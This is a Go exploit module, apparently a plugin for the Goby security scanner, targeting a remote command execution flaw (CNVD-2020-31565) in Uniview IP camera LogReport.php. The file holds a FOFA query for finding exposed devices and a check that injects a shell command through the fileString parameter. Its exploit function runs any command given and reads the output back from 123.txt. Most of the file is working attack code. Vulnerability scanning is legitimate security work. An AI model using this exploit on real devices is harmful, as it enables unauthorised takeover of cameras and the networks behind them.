package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "UNV ip camera LogReport.php file RCE",
    "Description": "<p>As a leading security camera service provider, Uniview can meet your security needs in different scenarios. Our IP cameras renders high-quality images even in low illumination environment while featuring smart functions based on video content analytics, and minimizing bandwidth and storage. The most important business value of them is to provide excellent performance at an affordable price.There is a RCE vulnerability in UNV ip camera.Attackers can exploit this vulnerability to get shell.</p>",
    "Impact": "<p>UNV ip camera RCE (CNVD-2020-31565)</p>",
    "Recommendation": "<p>The supplier has released a solution, please pay a attention to manufacturer homepage :<a href=\"https://cn.uniview.com/\">https://cn.uniview.com/</a></p>",
    "Product": "UNV ip camera",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "浙江宇视科技 网络视频录像机 ISC LogReport.php 文件远程命令执行漏洞",
            "Product": "浙江宇视科技网络视频录像机",
            "Description": "<p>浙江宇视科技网络视频录像机是一款高清无线的网络摄像。</p><p>浙江宇视科技网络视频录像机 LogReport.php 文件存在远程命令执行漏洞，攻击者可通过该漏洞执行系统命令。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://cn.uniview.com/\">https://cn.uniview.com/</a></p>",
            "Impact": "<p>浙江宇视科技网络视频录像机 LogReport.php 文件存在远程命令执行漏洞，攻击者可通过该漏洞执行系统命令。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "UNV ip camera LogReport.php file RCE",
            "Product": "UNV ip camera",
            "Description": "<p>As a leading security camera service provider, Uniview can meet your security needs in different scenarios. Our IP cameras renders high-quality images even in low illumination environment while featuring smart functions based on video content analytics, and minimizing bandwidth and storage. The most important business value of them is to provide excellent performance at an affordable price.There is a RCE vulnerability in UNV ip camera.Attackers can exploit this vulnerability to get shell.</p>",
            "Recommendation": "<p>The supplier has released a solution, please pay a attention to manufacturer homepage :<a href=\"https://cn.uniview.com/\" rel=\"nofollow\">https://cn.uniview.com/</a></p>",
            "Impact": "<p>UNV ip camera RCE (CNVD-2020-31565)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"Alarm\" && body=\"白牌定制\"",
    "GobyQuery": "body=\"Alarm\" && body=\"白牌定制\"",
    "Author": "AnMing",
    "Homepage": "https://cn.uniview.com/",
    "DisclosureDate": "2022-04-07",
    "References": [
        "http://wiki.peiqi.tech/wiki/iot/%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80%20%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA%20ISC%20LogReport.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2020-31565"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Command",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10364"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			flag := "205ce983f7ee4aaa62b0e96a48c052498"
			url := "/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20" + flag + ">123.txt"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Referer", u.FixedHostInfo)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 {
					cfg.URI = "/Interface/LogReport/123.txt"
					if resp, err = httpclient.DoHttpRequest(u, cfg); err == nil {
						reg := regexp.MustCompile(flag)
						result := reg.FindStringSubmatch(resp.Utf8Html)
						if len(result) > 0 {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["Command"].(string)
			url := "/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;" + cmd + ">123.txt"
			url = strings.Replace(url, " ", "%20", -1)
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", expResult.HostInfo.HostInfo)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					cfg.URI = "/Interface/LogReport/123.txt"
					if resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if len(resp.Utf8Html) > 0 {
							expResult.Success = true
							expResult.Output = resp.Utf8Html
							return expResult
						}
					}
				}
			}
			expResult.Output = "ERROR! Plase check your input!"
			return expResult
		},
	))
}
